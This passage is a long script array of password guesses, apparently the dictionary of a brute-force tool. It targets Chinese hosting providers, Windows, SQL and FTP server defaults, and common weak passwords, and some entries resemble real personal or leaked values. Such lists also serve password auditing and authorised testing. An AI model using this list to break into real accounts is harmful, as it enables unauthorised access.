$pass[536] = "gmjiayangzi520"
$pass[537] = "gmjiawage520"
$pass[538] = "gmjiadianhenai"
$pass[539] = "gmjiawocaonimei"
$pass[540] = "gmjiatongyuan520"
$pass[541] = "aaaidc.com444284"
$pass[542] = "gmjiashanren94"
$pass[543] = "gmjia75nigansm"
$pass[544] = "gmjiayongyuan123"
$pass[545] = "xiao@#13798666881"
$pass[546] = "gmjiadianhenhao"
$pass[547] = "gmjiasssyyygg"
$pass[548] = "tangchao20!!"
$pass[549] = "yingp!@$#nissan"
$pass[550] = "hao123.com"
$pass[551] = "zhanglingyun3590133!@!@"
$pass[552] = "a123654"
$pass[553] = "dawei"
$pass[554] = "dawei123"
$pass[555] = "mail.2020idc.com"
$pass[556] = "lovelong2020mail"
$pass[557] = "admin@2020idc.com"
$pass[558] = "lovelong2233"
$pass[559] = "menglonglong1988"
$pass[560] = "oracl123!@#"
$pass[561] = "ftpuser"
$pass[562] = "weblogic"
$pass[563] = "mylove"
$pass[564] = "3441163"
$pass[565] = "zjf26388"
$pass[566] = "440203"
$pass[567] = "qwer1234"
$pass[568] = "3344"
$pass[569] = "zxcvbnm``12345"
$pass[570] = "159357456"
$pass[571] = "huang3669065"
$pass[572] = "chemistry520"
$pass[573] = "paixu!@#$%^&"
$pass[574] = "ymidc"
$pass[575] = "1qaz@4rfv"
$pass[576] = "123-456-789"
$pass[577] = "PINIDC.COM9477"
$pass[578] = "llwl507cn.1314"
$pass[579] = "177@cz7"
$pass[580] = "czidc"
$pass[581] = "TANGCHAO20!!"
$pass[582] = "czidc.com"
$pass[583] = "wuhusihai"
$pass[584] = "caonima123"
$pass[585] = "esincsidc"
$pass[586] = "cinternet."
$pass[587] = "!Q@W#E$R%T"
$pass[588] = "123456a"
$pass[589] = "xiaoxiao"
$pass[590] = "p@ssword@WSXxinNET"
$pass[591] = "123456qwerty"
$pass[592] = "13579"
$pass[593] = "147258369"
$pass[594] = "789789"
$pass[595] = "meiyoumima"
$pass[596] = "!QAZXSW@#EDCVFR$"
$pass[597] = "feitong!@#"
$pass[598] = "456852"
$pass[599] = "rst_login../"
$pass[600] = "666888"
$pass[601] = "jindun"
$pass[602] = "qq123"
$pass[603] = "vcenter"
$pass[604] = "923133116"
$pass[605] = "chuanqiqusi!"
$pass[606] = "qwer123!@#"
$pass[607] = "rinima"
$pass[608] = "sisi123"
$pass[609] = "local"
$pass[610] = "abc123!@#"
$pass[611] = "arp123"
$pass[612] = "qq.com"
$pass[613] = "888999"
$pass[614] = "1qaz@WSX"
$pass[615] = "gannilaomu"
$pass[616] = "v01.cn!@#"
$pass[617] = "!@#$%^123"
$pass[618] = "zitian"
$pass[619] = "west999"
$pass[620] = "chinanet"
$pass[621] = "china125"
$pass[622] = "zxcvbnm,."
$pass[623] = "xuxulike"
$pass[624] = "xuxulike.com"
$pass[625] = "!@#$qwerASDFzxcv"
$pass[626] = "147369"
$pass[627] = "a123456"
$pass[628] = "1qaz"
$pass[629] = "baidu.com"
$pass[630] = "123.com"
$pass[631] = "rednet"
$pass[632] = "12345qwert"
$pass[633] = "qazwsx123"
$pass[634] = "123987"
$pass[635] = "wangwei"
$pass[636] = "china35"
$pass[637] = "1122"
$pass[638] = "qweqwe123"
$pass[639] = "asdf!@#$"
$pass[640] = "9988"
$pass[641] = "xxx123"
$pass[642] = "110110110"
$pass[643] = "258258"
$pass[644] = "!QAZ2wsx"
$pass[645] = "5199280356"
$pass[646] = "yzidc"
$pass[647] = "yd2008slkui"
$pass[648] = "cinternet_yhj"
$pass[649] = "cinternet_yhj."
$pass[650] = "xx...110"
$pass[651] = "clh2869665!@#$"
$pass[652] = "xzd761109"
$pass[653] = "php51.90"
$pass[654] = "qwe123"
$pass[655] = "www.czidc.com"
$pass[656] = "xiaohui"
$pass[657] = "lee19880507"
$pass[658] = "china333IDC"
$pass[659] = "sxidc"
$pass[660] = "1q2w3e,./?"
$pass[661] = "wxj2012168"
$pass[662] = "admin5idc"
$pass[663] = "zmbbst0825"
$pass[664] = "sxidc.123"
$pass[665] = "baobeiyaojing"
$pass[666] = "www.gougou.com"
$pass[667] = "7758258"
$pass[668] = "010203"
$pass[669] = "woaini"
$pass[670] = "gongxifacai"
$pass[671] = "kiss&129116"
$pass[672] = "lh222"
$pass[673] = "idcidc"
$pass[674] = "wangqianyu"
$pass[675] = "jiezu"
$pass[676] = "idctest"
$pass[677] = "huangyong321"
$pass[678] = "qaz111"
$pass[679] = "a890991"
$pass[680] = "ddd123"
$pass[681] = "jjidc.com"
$pass[682] = "xiahui123"
$pass[683] = "cn1230"
$pass[684] = "07.cx"
$pass[685] = "v01.cna"
$pass[686] = "1q2w3e4r5t6y"
$pass[687] = "network"
$pass[688] = ")(*&^%$#@!"
$pass[689] = "yangxianrong"
$pass[690] = "33443344"
$pass[691] = "177@dg1"
$pass[692] = "521"
$pass[693] = "idclixin"
$pass[694] = "wocaonima"
$pass[695] = "asd123456"
$pass[696] = "windows98"
$pass[697] = "xiaoma008!@#"
$pass[698] = "zzz"
$pass[699] = "778899"
$pass[700] = "www.51vip.net3000"
$pass[701] = "Alqangonet12345"
$pass[702] = "hulian_2011"
$pass[703] = "q1w2e3r4t5y6u7i8o9"
$pass[704] = "liulibin840629"
$pass[705] = "c361.com"
$pass[706] = "123456aa"
$pass[707] = "www.idchy.com"
$pass[708] = "123qweasd"
$pass[709] = "idchy.com"
$pass[710] = "wei13967043055"
$pass[711] = "idchy"
$pass[712] = "xhcm2011"
$pass[713] = "vhfscp123"
$pass[714] = "34196362"
$pass[715] = "zxcvbnm,./520"
$pass[716] = "123.0"
$pass[717] = "1231234"
$pass[718] = "rainsm_kkdyw"
$pass[719] = "daijun224"
$pass[720] = "chinaidcw168"
$pass[721] = "idc123!@#"
$pass[722] = "NOD323389"
$pass[723] = "gmjiawang"
$pass[724] = "123!@#"
$pass[725] = "ZAQ12WSX"
$pass[726] = "!QAZ@WSX"
$pass[727] = "chinaidcw.com168!@#"
$pass[728] = "395zfpay_data"
$pass[729] = "TRYOIUPIUdysf768123"
$pass[730] = "ytutui!@#$%^*&*(H5678"
$pass[731] = "www.idchw.com"
$pass[732] = "idchw.com"
$pass[733] = "9000idc"
$pass[734] = "qq0526"
$pass[735] = "huachen1258zz"
$pass[736] = "8888..."
$pass[737] = "cxcx0258258"
$pass[738] = "33133..."
$pass[739] = "33133.."
$pass[740] = "bbs"
$pass[741] = "33133"
$pass[742] = "qaz000..."
$pass[743] = "biyi0791.com"
$pass[744] = "953139."
$pass[745] = "oaoidc6688"
$pass[746] = "987258"
$pass[747] = "www.3hidc.com"
$pass[748] = "#654298#"
$pass[749] = "jyx123109"
$pass[750] = "585858"
$pass[751] = ".......g"
$pass[752] = "luoshun1125"
$pass[753] = "mrgool_mrgool"
$pass[754] = "xp2010win2000"
$pass[755] = "gameidc"
$pass[756] = "xldxx***91;***93;***91;***93;"
$pass[757] = "dhlxm83840309~"
$pass[758] = "19885510"
$pass[759] = "xyidc_2006"
$pass[760] = "1234/add"
$pass[761] = "chinese2010"
$pass[762] = "gmjiaguizu"
$pass[763] = "mrgool_010"
$pass[764] = "90uxqiutian"
$pass[765] = "gtkejicai!"
$pass[766] = "95217189"
$pass[767] = "95217"
$pass[768] = "741852963"
$pass[769] = "951357"
$pass[770] = "456456"
$pass[771] = "haoeii"
$pass[772] = "zhouping"
$pass[773] = "369258147"
$pass[774] = "asd123!@#"
$pass[775] = "963852741"
$pass[776] = "andy"
$pass[777] = "v01.cnidc"
$pass[778] = "963852"
$pass[779] = "zhangzhao"
$pass[780] = "258789"
$pass[781] = "idcuser"
$pass[782] = "times"
$pass[783] = "stsysg@qq.com"
$pass[784] = "ghostsys123"
$pass[785] = "159357asdf"
$pass[786] = "qq520520--++"
$pass[787] = "huacheng123!@#"
$pass[788] = "idc2011!@#"
$pass[789] = "owen!@#"
$pass[790] = "lg@123456"
$pass[791] = "bai363002"
$pass[792] = "pass@word"
$pass[793] = "85021400"
$pass[794] = "hao123"
$pass[795] = ".......32"
$pass[796] = "18003888446"
$pass[797] = "40062658133"
$pass[798] = "zbdgmhaoma"
$pass[799] = "dabao55555"
$pass[800] = "4255"
$pass[801] = "sbwhfe"
$pass[802] = "yudi7766"
$pass[803] = "zxcvbn"
$pass[804] = "123456gg"
$pass[805] = "2011"
$pass[806] = "456123"
$pass[807] = "895623"
$pass[808] = "789456"
$pass[809] = "794613"
$pass[810] = "784512"
$pass[811] = "asdfgh"
$pass[812] = "8762973"
$pass[813] = "m&g_2008"
$pass[814] = "123456654321"
$pass[815] = "winner!@#"
$pass[816] = ")*network$@@^"
$pass[817] = "caony8530468"
$pass[818] = "84471183aa"
$pass[819] = "wantian##*("
$pass[820] = "qwe1234"
$pass[821] = "cjmljy881001"
$pass[822] = "aitangning"
$pass[823] = "123qwer"
$pass[824] = "idcji2010"
$pass[825] = "asd123"
$pass[826] = "9001"
$pass[827] = "9001a"
$pass[828] = "258.852"
$pass[829] = "147.741"
$pass[830] = "369.963"
$pass[831] = "123.321"
$pass[832] = "fucktlfuck49"
$pass[833] = "wei15874931177"
$pass[834] = "14361256malin"
$pass[835] = "yangyang"
$pass[836] = "19920929"
$pass[837] = "haoyingyulu4775652"
$pass[838] = "yexiaodonghappy"
$pass[839] = "manmancai8.com"
$pass[840] = "!@#lanqing0902"
$pass[841] = "@yh780202"
$pass[842] = "wangzi123345,./"
$pass[843] = "14361256malin.,"
$pass[844] = "wh1979522.89"
$pass[845] = "zhao520123."
$pass[846] = "dhlxm83840309~!"
$pass[847] = "zj124.70./*-"
$pass[848] = "pp123321"
$pass[849] = "4006266224"
$pass[850] = "Think#$!"
$pass[851] = "~!@#$^"
$pass[852] = "ln5203344***"
$pass[853] = "china999IDC"
$pass[854] = "wolisiyu"
$pass[855] = "ds.dw587~!@dd.."
$pass[856] = "www.9000idc.com"
$pass[857] = "9000idc.com!@#"
$pass[858] = "460230"
$pass[859] = "panlei8039"
$pass[860] = "95599malin.,"
$pass[861] = "SXidc!@#456"
$pass[862] = "588583"
$pass[863] = "china566IDC"
$pass[864] = "onlyidc"
$pass[865] = "199099"
$pass[866] = "a600648"
$pass[867] = "123322"
$pass[868] = "china555IDC"
$pass[869] = "158"
$pass[870] = "198787"
$pass[871] = "buzhidao"
$pass[872] = "360495003"
$pass[873] = "mimashiduoshao"
$pass[874] = "china653IDC"
$pass[875] = "china353IDC"
$pass[876] = "idc"
$pass[877] = "76101348"
$pass[878] = "123asd"
$pass[879] = "951139."
$pass[880] = "idcth"
$pass[881] = "tyidc"
$pass[882] = "jd8idc.com"
$pass[883] = "jd8idc"
$pass[884] = "321123"
$pass[885] = "esin888"
$pass[886] = "123456!@#"
$pass[887] = "12345!@#$%"
$pass[888] = "12345^&*()"
$pass[889] = "idcidcok"
$pass[890] = "caonima!@#"
$pass[891] = "1234abcd"
$pass[892] = "caonima"
$pass[893] = "www.idcquan.com"
$pass[894] = "www.fj163.com"
$pass[895] = "www.10idc.com"
$pass[896] = "notfound!"
$pass[897] = "gdty@))**"
$pass[898] = "gmidc.com"
$pass[899] = "123456.com"
$pass[900] = "qq123456.com"
$pass[901] = "10idc.com"
$pass[902] = "tianxi1000"
$pass[903] = "idcth.com"
$pass[904] = "59999"
$pass[905] = "321087"
$pass[906] = "qqq123"
$pass[907] = "951"
$pass[908] = "123abc"
$pass[909] = "YUDI123"
$pass[910] = "870226linjin."
$pass[911] = "1297225."
$pass[912] = "5188"
$pass[913] = "654321789"
$pass[914] = "lgy6390029"
$pass[915] = "winner"
$pass[916] = "winner!@#00"
$pass[917] = "!Q@W#E"
$pass[918] = "idc123456"
$pass[919] = "888idc"
$pass[920] = "china.com"
$pass[921] = "w1e2r3t4"
$pass[922] = "123!@#$"
$pass[923] = "}"
$pass[924] = "chinadatas"
$pass[925] = "nihao123"
$pass[926] = "www.666idc.com"
$pass[927] = "idcji2011"
$pass[928] = "666idc.com"
$pass[929] = "666idc"
$pass[930] = "www.nfvip.com"
$pass[931] = "nfvip"
$pass[932] = "2005gm.com.."
$pass[933] = "idc201103"
$pass[934] = "qq1314521"
$pass[935] = "qq5211314"
$pass[936] = "aistar123<>!N"
$pass[937] = "panshi"
$pass[938] = "v01.cn"
$pass[939] = "chinaidcok"
$pass[940] = "aaa123!@#"
$pass[941] = "www.aaaidc.com"
$pass[942] = "aaaidc"
$pass[943] = "sanhe000"
$pass[944] = "xhdcgn123"
$pass[945] = "qs1234!@#"
$pass[946] = "bl-kj@123"
$pass[947] = "menglong2011"
$pass[948] = "changkun1008"
$pass[949] = "enkj.com"
$pass[950] = "enkjidc"
$pass[951] = "www.enkj.com"
$pass[952] = "idc101.com"
$pass[953] = "idc101"
$pass[954] = "dq06"
$pass[955] = "xiaozhang"
$pass[956] = "admin5201314"
$pass[957] = "warcraft"
$pass[958] = "asd456"
$pass[959] = "asd789"
$pass[960] = "nihao"
$pass[961] = "5@177cz"
$pass[962] = "7@177cz"
$pass[963] = "89519"
$pass[964] = "xiaozhang123"
$pass[965] = "``11`***"
$pass[966] = "qq138849911"
$pass[967] = "www.11.com"
$pass[968] = "zxcvbn!@#"
$pass[969] = "zxcvbn123"
$pass[970] = "456"
$pass[971] = "1314"
$pass[972] = "admin@123"
$pass[973] = "Admin123"
$pass[974] = "qazwer1231"
$pass[975] = "qazqwert"
$pass[976] = "qazwert"
$pass[977] = "@dmin"
$pass[978] = "admin??"
$pass[979] = "P@$$word"
$pass[980] = "345345"
$pass[981] = "95313"
$pass[982] = "321654"
$pass[983] = "753951"
$pass[984] = "258369"
$pass[985] = "951753"
$pass[986] = "P@SSWORD"
$pass[987] = "super"
$pass[988] = "110"
$pass[989] = "119"
$pass[990] = "qwertyuiop***91;***93;"
$pass[991] = "zhangsan"
$pass[992] = "123456788"
$pass[993] = "webadmin"
$pass[994] = "WEBadmin"
$pass[995] = "login"
$pass[996] = "fuwuqi"
$pass[997] = "wlozz"
$pass[998] = "p@$$w0rd"
$pass[999] = "wentongweb"
$pass[1000] = "asdasd"
$pass[1001] = "fuck"
$pass[1002] = "anything"
$pass[1003] = "www.12345.com"
$pass[1004] = "wwww.123456.com"
$pass[1005] = "12345.com"
$pass[1006] = "1234.com"
$pass[1007] = "Password123"
$pass[1008] = "feixiang!@#"
$pass[1009] = "winn2000"
$pass[1010] = "win2003"
$pass[1011] = "1234asdf!@#"
$pass[1012] = "gold1446!$$^"
$pass[1013] = "admin@888"
$pass[1014] = "111aaa"
$pass[1015] = "123qqq"
$pass[1016] = "123qqq..."
$pass[1017] = "123kkk"
$pass[1018] = "david"
$pass[1019] = "1q2w3e4r!@#$"
$pass[1020] = "321.321"
$pass[1021] = "@dmin123"
$pass[1022] = "@dministrator"
$pass[1023] = "a123456789"
$pass[1024] = "789klsd"
$pass[1025] = "pa$$w0rd"
$pass[1026] = "Pa$$s0rd"
$pass[1027] = "samuel"
$pass[1028] = "3H8IDC!!#"
$pass[1029] = "3H8IDC72sanhe000"
$pass[1030] = "sanhe000~!@#"
$pass[1031] = "Chinawidc168"
$pass[1032] = "Chinaidcw"
$pass[1033] = "deoogulhk"
$pass[1034] = "esincs"
$pass[1035] = "esin.com"
$pass[1036] = "www.esin.com"
$pass[1037] = "xiaoyili"
$pass[1038] = "sanhe123"
$pass[1039] = "admin888!@#"
$pass[1040] = "chinaidc"
$pass[1041] = "www.123.com"
$pass[1042] = "!@#19841010"
$pass[1043] = "admin@456"
$pass[1044] = "admin@789"
$pass[1045] = "admin@!@#"
$pass[1046] = "admin123!@#"
$pass[1047] = "admin456!@#"
$pass[1048] = "admin789!@#"
$pass[1049] = "~!@#$%^&*"
$pass[1050] = "chinayixun"
$pass[1051] = "112"
$pass[1052] = "dragon"
$pass[1053] = "abcd12345"
$pass[1054] = "abcdabcd"
$pass[1055] = "abc@123"
$pass[1056] = "abc@456"
$pass[1057] = "htidchtidc"
$pass[1058] = "gold!@#$%^&*"
$pass[1059] = "zhanjiang"
$pass[1060] = "asd456!@#"
$pass[1061] = "asd789!@#"
$pass[1062] = "sqladmin"
$pass[1063] = "admin@admin"
$pass[1064] = "admin@pass"
$pass[1065] = "admin@mysql"
$pass[1066] = "lituobestsanmao"
$pass[1067] = "qazasd"
$pass[1068] = "server2003"
$pass[1069] = "2003server"
$pass[1070] = "sqlpass"
$pass[1071] = "zbb2011"
$pass[1072] = "1qaz@2wsx"
$pass[1073] = "123asd!@#"
$pass[1074] = "8812345!@#"
$pass[1075] = "gateway"
$pass[1076] = "!QA@WS#ED4rf5tg"
$pass[1077] = "!qaz@wsx"
$pass[1078] = "baodaye"
$pass[1079] = "idc123.123"
$pass[1080] = "qazwsx123456"
$pass[1081] = "qwerty123456"
$pass[1082] = "!q@w#e$r"
$pass[1083] = "q!w@e#"
$pass[1084] = "q!w@e#r$"
$pass[1085] = "!1@2#3$4"
$pass[1086] = "!1@2#3$4%5"
$pass[1087] = "!1@2#3$4%5^6"
$pass[1088] = "qwer4321!@#$"
$pass[1089] = "web123"
$pass[1090] = "aaa222"
$pass[1091] = "aaa111"
$pass[1092] = "Password123!@#"
$pass[1093] = "123@idc"
$pass[1094] = "admin@idc"
$pass[1095] = "dhmnyh"
$pass[1096] = "q1w2Q!W@"
$pass[1097] = "qwer123"
$pass[1098] = "qwer1234!@#"
$pass[1099] = "qwer!@"
$pass[1100] = "qwer!@#$"
$pass[1101] = "admin110"
$pass[1102] = "admin456"
$pass[1103] = "1!qaz2@wsx"
$pass[1104] = "zbb@idc"
$pass[1105] = "zbb2012"
$pass[1106] = "zbb@admin"
$pass[1107] = "admin@zbb"
$pass[1108] = "qq2011"
$pass[1109] = "qq2012"
$pass[1110] = "qq@2011"
$pass[1111] = "qq@2012"
$pass[1112] = "admin@qq"
$pass[1113] = "power123"
$pass[1114] = "admin@a123456"
$pass[1115] = "admin@com"
$pass[1116] = "1230.0"
$pass[1117] = "1234560.0"
$pass[1118] = "admin@0.0"
$pass[1119] = "admin0.0"
$pass[1120] = "!@#$qwerasdf"
$pass[1121] = "woshiguanliyuan"
$pass[1122] = "power123.0"
$pass[1123] = "!@#$%^&*()_+"
$pass[1124] = "123.456.789"
$pass[1125] = "qazzaq"
$pass[1126] = "sysadmin"
$pass[1127] = "qwe.123"
$pass[1128] = "123456movie"
$pass[1129] = "123456love"
$pass[1130] = "kingdee"
$pass[1131] = "asd111"
$pass[1132] = "12qw12qw"
$pass[1133] = "123@qwe"
$pass[1134] = "wutian1010"
$pass[1135] = "wutian"
$pass[1136] = "wutian123"
$pass[1137] = "wutian2012"
$pass[1138] = "tuidc"
$pass[1139] = "123456b"
$pass[1140] = "123456.cn"
$pass[1141] = "111222"
$pass[1142] = "jiandan123"
$pass[1143] = "jiandan"
$pass[1144] = "jiandan1233"
$pass[1145] = "jiandan1234"
$pass[1146] = "jiandan12345"
$pass[1147] = "xxoo"
$pass[1148] = "xxoo520"
$pass[1149] = "xxoo521"
$pass[1150] = "xxoo123"
$pass[1151] = "123.aa"
$pass[1152] = "monitor"
$pass[1153] = "6yhn7ujm"
$pass[1154] = "idc0000"
$pass[1155] = "intel"
$pass[1156] = "9y3x5m2lj"
$pass[1157] = "user3"
$pass[1158] = "net"
$pass[1159] = "pass123"
$pass[1160] = "pass1234"
$pass[1161] = "passe"
$pass[1162] = "passw"
$pass[1163] = "password12"
$pass[1164] = "prueba"
$pass[1165] = "open"
$pass[1166] = "system32"
$pass[1167] = "username"
$pass[1168] = "admins"
$pass[1169] = "007"
$pass[1170] = "007007"
$pass[1171] = "01235"
$pass[1172] = "0246"
$pass[1173] = "0249"
$pass[1174] = "112112"
$pass[1175] = "1123"
$pass[1176] = "1133"
$pass[1177] = "113355"
$pass[1178] = "1212"
$pass[1179] = "121212"
$pass[1180] = "1225"
$pass[1181] = "1313"
$pass[1182] = "1a2b3c"
$pass[1183] = "1qw23e"
$pass[1184] = "1qwerty"
$pass[1185] = "2004"
$pass[1186] = "2006"
$pass[1187] = "2009"
$pass[1188] = "2112"
$pass[1189] = "332211"
$pass[1190] = "6969"
$pass[1191] = "696969"
$pass[1192] = "aa"
$pass[1193] = "aaa"
$pass[1194] = "abc"
$pass[1195] = "backup"
$pass[1196] = "ftp"
$pass[1197] = "alex"
$pass[1198] = "good"
$pass[1199] = "php"
$pass[1200] = "q"
$pass[1201] = "r00t"
$pass[1202] = "reseller"
$pass[1203] = "success"
$pass[1204] = "olga"
$pass[1205] = "zaxscd"
$pass[1206] = "zsxdc"
$pass[1207] = "zxcasd"
$pass[1208] = "zxcvb"
$pass[1209] = "1010"
$pass[1210] = "101010"
$pass[1211] = "1221"
$pass[1212] = "12321"
$pass[1213] = "2323"
$pass[1214] = "232323"
$pass[1215] = "account"
$pass[1216] = "daniel"
$pass[1217] = "data"
$pass[1218] = "director"
$pass[1219] = "manage"
$pass[1220] = "manager1"
$pass[1221] = "P@ssword"
$pass[1222] = "qwert"
$pass[1223] = "sa"
$pass[1224] = "server1"
$pass[1225] = "setup"
$pass[1226] = "superuser"
$pass[1227] = "support1"
$pass[1228] = "system1"
$pass[1229] = "administrator1"
$pass[1230] = "sysadmin1"
$pass[1231] = "P@ssw0rd1"
$pass[1232] = "wordpass"
$pass[1233] = "Pa$$word"
$pass[1234] = "Passw0rd1"
$pass[1235] = "nopassword"
$pass[1236] = "pasword"
$pass[1237] = "p@ssword"
$pass[1238] = "p@ss"
$pass[1239] = "pass1"
$pass[1240] = "Support"
$pass[1241] = "120"
$pass[1242] = "113"
$pass[1243] = "114"
$pass[1244] = "123000"
$pass[1245] = "123111"
$pass[1246] = "aaa123"
$pass[1247] = "abc123456"
$pass[1248] = "1230.."
$pass[1249] = "zxcasdqwe"
$pass[1250] = "admiadmin"
$pass[1251] = "110110"
$pass[1252] = "guest"
$pass[1253] = "123.idc"
$pass[1254] = "!@QWASZX"
$pass[1255] = "123a"
$pass[1256] = "789"
$pass[1257] = "qwert12345"
$pass[1258] = "123456789a"
$pass[1259] = "idc2010"
$pass[1260] = "idc2012"
$pass[1261] = "guanli"
$pass[1262] = "qqaazz"
$pass[1263] = "147"
$pass[1264] = "258"
$pass[1265] = "369"
$pass[1266] = "Pass@word"
$pass[1267] = "admin!@#"
$pass[1268] = "abc!@#"
$pass[1269] = "fuckyou"
$pass[1270] = "ILoveyou"
$pass[1271] = "111qqq..."
$pass[1272] = "235689"
$pass[1273] = "326598"
$pass[1274] = "qq123.com"
$pass[1275] = "10000"
$pass[1276] = "power.liu"
$pass[1277] = "idc0514"
$pass[1278] = "power.yu"
$pass[1279] = "power.com"
$pass[1280] = "power0.123"
$pass[1281] = "0258"
$pass[1282] = "2323456"
$pass[1283] = "5656789"
$pass[1284] = "1qaz1qaz"
$pass[1285] = "!@#321"
$pass[1286] = "321!@#"
$pass[1287] = "#@!123"
$pass[1288] = "#@!321"
$pass[1289] = "windows2003"
$pass[1290] = "ADMIN"
$pass[1291] = "a12345"
$pass[1292] = "a1b2c3"
$pass[1293] = "a1b2c3d4"
$pass[1294] = "!@#!@#!@#"
$pass[1295] = "ADMIN123"
$pass[1296] = "SERVER"
$pass[1297] = "ip138"
$pass[1298] = "a1234"
$pass[1299] = "a1234567"
$pass[1300] = "a12345678"
$pass[1301] = "caonimagebi"
$pass[1302] = "zxcvbnm,./"
$pass[1303] = "asdfghjkl;"
$pass[1304] = "idc0.1"
$pass[1305] = "123asdasd"
$pass[1306] = "idc0001"
$pass[1307] = "idc800888"
$pass[1308] = "love"
$pass[1309] = "zxc123"
$pass[1310] = "qqq"
$pass[1311] = "chenxin"
$pass[1312] = "qwe1231a"
$pass[1313] = "p0o9i8u7"
$pass[1314] = "1q2w3e,"
$pass[1315] = "dg10"
$pass[1316] = "a1s2d3"
$pass[1317] = "1a2s3d"
$pass[1318] = "a1s2d3f4"
$pass[1319] = "1a2s3d4f"
$pass[1320] = "1a2s3d4f5g"
$pass[1321] = "a1s2d3f4g5"
$pass[1322] = "1a2s3d4f5g6h"
$pass[1323] = "a1s2d3f4g5h6"
$pass[1324] = "1a2s3d4f5g6h7j"
$pass[1325] = "a1s2d3f4g5h6j7"
$pass[1326] = "1a2s3d4f5g6h7j8k"
$pass[1327] = "a1s2d3f4g5h6j7k8"
$pass[1328] = "1a2s3d4f5g6h7j8k9l"
$pass[1329] = "a1s2d3f4g5h6j7k8l9"
$pass[1330] = "lai813524"
$pass[1331] = "q1w2"
$pass[1332] = "office1"
$pass[1333] = "1p2o3i"
$pass[1334] = "1qw23er45ty67u"
$pass[1335] = "1qz"
$pass[1336] = "123admin"
$pass[1337] = "123asdf"
$pass[1338] = "123ewq"
$pass[1339] = "123go"
$pass[1340] = "123test"
$pass[1341] = "123454"
$pass[1342] = "224466"
$pass[1343] = "1234565"
$pass[1344] = "aaaa"
$pass[1345] = "aaaaa"
$pass[1346] = "abgrtyu"
$pass[1347] = "accept"
$pass[1348] = "adm1n1strator"
$pass[1349] = "adm1n"
$pass[1350] = "adm1nistrator"
$pass[1351] = "Admin1"
$pass[1352] = "admin!"
$pass[1353] = "administrat0r"
$pass[1354] = "administrator12"
$pass[1355] = "administrator123"
$pass[1356] = "administrator1234"
$pass[1357] = "administrator12345"
$pass[1358] = "administrator123456"
$pass[1359] = "adminpass"
$pass[1360] = "adminroot"
$pass[1361] = "adminserver"
$pass[1362] = "adminservers"
$pass[1363] = "admpro"
$pass[1364] = "admsuper"
$pass[1365] = "america"
$pass[1366] = "amministratore"
$pass[1367] = "angel"
$pass[1368] = "any"
$pass[1369] = "apache"
$pass[1370] = "apollo"
$pass[1371] = "apollo13"
$pass[1372] = "apple"
$pass[1373] = "aqwert"
$pass[1374] = "archie"
$pass[1375] = "ASDAS"
$pass[1376] = "asddsa"
$pass[1377] = "ASDF"
$pass[1378] = "asdf123"
$pass[1379] = "asdfg"
$pass[1380] = "asdfghjk"
$pass[1381] = "asdfjkl"
$pass[1382] = "asdsa"
$pass[1383] = "asdzxc"
$pass[1384] = "asembler"
$pass[1385] = "ashley"
$pass[1386] = "ask"
$pass[1387] = "asshole"
$pass[1388] = "baby"
$pass[1389] = "babygirl"
$pass[1390] = "backupexec"
$pass[1391] = "badboy"
$pass[1392] = "banana"
$pass[1393] = "batman"
$pass[1394] = "bigbird"
$pass[1395] = "bigcock"
$pass[1396] = "bigdick"
$pass[1397] = "bigdog"
$pass[1398] = "bigfoot"
$pass[1399] = "bigmac"
$pass[1400] = "bigman"
$pass[1401] = "bigred"
$pass[1402] = "bigtits"
$pass[1403] = "bitch"
$pass[1404] = "blablabla"
$pass[1405] = "black"
$pass[1406] = "blank"
$pass[1407] = "bond007"
$pass[1408] = "booboo"
$pass[1409] = "boss"
$pass[1410] = "business"
$pass[1411] = "buster"
$pass[1412] = "buzz"
$pass[1413] = "changeme"
$pass[1414] = "client"
$pass[1415] = "clustadm"
$pass[1416] = "cluster"
$pass[1417] = "cocacola"
$pass[1418] = "code"
$pass[1419] = "codename"
$pass[1420] = "codeword"
$pass[1421] = "compaq"
$pass[1422] = "computer"
$pass[1423] = "controller"
$pass[1424] = "cookie"
$pass[1425] = "cool"
$pass[1426] = "cooladmin"
$pass[1427] = "crackme"
$pass[1428] = "customer"
$pass[1429] = "danger"
$pass[1430] = "database"
$pass[1431] = "default"
$pass[1432] = "dell"
$pass[1433] = "demo"
$pass[1434] = "desktop"
$pass[1435] = "diablo"
$pass[1436] = "diamond"
$pass[1437] = "dmz"
$pass[1438] = "doggie"
$pass[1439] = "domain"
$pass[1440] = "domino"
$pass[1441] = "email"
$pass[1442] = "enjoy"
$pass[1443] = "erotic"
$pass[1444] = "example"
$pass[1445] = "exchadm"
$pass[1446] = "exchange"
$pass[1447] = "explorer"
$pass[1448] = "extreme"
$pass[1449] = "facebook"
$pass[1450] = "fail"
$pass[1451] = "file"
$pass[1452] = "findme"
$pass[1453] = "forever"
$pass[1454] = "girl"
$pass[1455] = "golden"
$pass[1456] = "google"
$pass[1457] = "hack"
$pass[1458] = "hacked"
$pass[1459] = "hacker"
$pass[1460] = "hackme"
$pass[1461] = "hahaha"
$pass[1462] = "hammer"
$pass[1463] = "hardcore"
$pass[1464] = "haslo"
$pass[1465] = "heart"
$pass[1466] = "hello"
$pass[1467] = "helpme"
$pass[1468] = "home"
$pass[1469] = "hunting"
$pass[1470] = "ihavenopass"
$pass[1471] = "iloveyou"
$pass[1472] = "info"
$pass[1473] = "internet"
$pass[1474] = "kennwort"
$pass[1475] = "key"
$pass[1476] = "killer"
$pass[1477] = "KKKKKKK"
$pass[1478] = "lamer"
$pass[1479] = "letmein"
$pass[1480] = "linux"
$pass[1481] = "little"
$pass[1482] = "LocalAdministrator"
$pass[1483] = "lock"
$pass[1484] = "login1"
$pass[1485] = "login12"
$pass[1486] = "login123"
$pass[1487] = "login1234"
$pass[1488] = "login12345"
$pass[1489] = "login123456"
$pass[1490] = "lotus"
$pass[1491] = "mac"
$pass[1492] = "mail"
$pass[1493] = "main"
$pass[1494] = "maincomputer"
$pass[1495] = "march"
$pass[1496] = "market"
$pass[1497] = "marketing"
$pass[1498] = "matrix"
$pass[1499] = "member"
$pass[1500] = "midnight"
$pass[1501] = "money"
$pass[1502] = "monkey"
$pass[1503] = "mycomputer"
$pass[1504] = "myhome"
$pass[1505] = "mypass"
$pass[1506] = "mypassword"
$pass[1507] = "mypc"
$pass[1508] = "myself"
$pass[1509] = "myserver"
$pass[1510] = "myspace"
$pass[1511] = "newsletter"
$pass[1512] = "nobody"
$pass[1513] = "noob"
$pass[1514] = "nopass"
$pass[1515] = "nopassw"
$pass[1516] = "nopwd"
$pass[1517] = "noshit"
$pass[1518] = "notes"
$pass[1519] = "nothing"
$pass[1520] = "oracle"
$pass[1521] = "orange"
$pass[1522] = "orders"
$pass[1523] = "owner"
$pass[1524] = "p4ssw0rd"
$pass[1525] = "parole"
